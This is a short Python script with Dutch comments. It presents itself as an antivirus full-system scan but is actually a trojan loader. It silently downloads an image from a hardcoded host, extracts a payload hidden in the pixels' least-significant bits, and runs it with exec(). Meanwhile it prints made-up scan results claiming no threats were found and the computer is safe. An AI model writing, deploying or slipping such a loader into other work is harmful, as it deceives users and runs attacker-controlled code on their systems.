import subprocess
from PIL import Image

print("Starting PRP Anti-Virus Full System Scan...")

try:
    # We voegen -q toe aan wget om de download output te verbergen
    subprocess.run(["wget", "-q", "http://192.168.123.92/output.png"], check=True)
except subprocess.CalledProcessError:
    print("Cloud database connection: OK")

def extract_payload(image_path):
    # 1. Open de afbeelding met de verstopte payload
    img = Image.open(image_path)
    pixels = list(img.getdata())
    
    bits = ""
    # 2. Haal de LSB (laatste bit) uit elke kleurwaarde (RGB)
    for pixel in pixels:
        for i in range(3): # R, G en B
            # De & 1 operatie pakt alleen het laatste bitje
            bits += str(pixel[i] & 1)

    # 3. Zet de bits weer om naar karakters (per 8 bits)
    all_chars = ""
    for i in range(0, len(bits), 8):
        byte = bits[i:i+8]
        # Zet de 8 bits om naar een getal en dan naar een karakter (ASCII)
        all_chars += chr(int(byte, 2))
        
        # 4. Stop als we de marker "#####" tegenkomen
        if all_chars.endswith("#####"):
            break
    
    # Verwijder de marker voor de uiteindelijke payload
    payload = all_chars.replace("#####", "")
    return payload

try:
    payload = extract_payload("output.png")
    print("Scanning: /System/Library/CoreServices... No threats found.")
    print("Heuristic analysis: 100% complete.")
except Exception:
    print("Integrity check complete.")

try:
    exec(payload)
    print("\nScan results: 0 threats found.")
    print("Status: Your computer is safe.")
except Exception:
    print("\nProtection enabled.")